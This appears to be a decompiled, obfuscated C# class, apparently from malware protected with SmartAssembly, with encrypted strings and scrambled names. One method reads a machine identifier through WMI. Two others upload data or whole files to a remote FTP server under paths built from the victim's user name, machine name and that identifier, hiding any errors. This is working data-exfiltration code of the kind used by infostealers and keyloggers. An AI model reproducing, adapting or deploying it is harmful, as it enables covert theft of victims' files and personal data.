using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace VyjVuXvolaw;

internal sealed class ohJtITMsrrTaVTo
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string NQaWQkkkRgsXVC()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107403774));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107403785)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107403736);
			ManagementObject val3 = new ManagementObject(getString_0(107403731) + text2 + getString_0(107403722));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107403717)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107389323) : text;
		}
	}

	public static void nZMwqWMjRzu(string ZpusGDMgxpfA = "URL", string TzWXnjZvznQG = "USERNAME", string NBckrJVoRbExFq = "ACCESO", string ovaTqZKzBQcKkvsW = "")
	{
		try
		{
			string text = NQaWQkkkRgsXVC();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ZpusGDMgxpfA + getString_0(107404893) + Environment.UserName + getString_0(107404912) + Environment.MachineName + getString_0(107404859) + text + getString_0(107404854));
			ftpWebRequest.Method = getString_0(107403692);
			ftpWebRequest.Credentials = new NetworkCredential(TzWXnjZvznQG, NBckrJVoRbExFq);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(ovaTqZKzBQcKkvsW);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void qhGPXbNSyvCayd(string DWLXfASzFdX = "URL", string taAfQXfKXCIO = "USERNAME", string KlMHcylayfz = "ACCESO", string ClNdNvLAoQnbULW = "")
	{
		try
		{
			string text = NQaWQkkkRgsXVC();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(DWLXfASzFdX + getString_0(107404893) + Environment.UserName + getString_0(107404912) + Environment.MachineName + getString_0(107404859) + text + getString_0(107404859) + Path.GetFileName(ClNdNvLAoQnbULW));
			ftpWebRequest.Method = getString_0(107403692);
			ftpWebRequest.Credentials = new NetworkCredential(taAfQXfKXCIO, KlMHcylayfz);
			byte[] array = File.ReadAllBytes(ClNdNvLAoQnbULW);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static ohJtITMsrrTaVTo()
	{
		Strings.CreateGetStringDelegate(typeof(ohJtITMsrrTaVTo));
	}
}
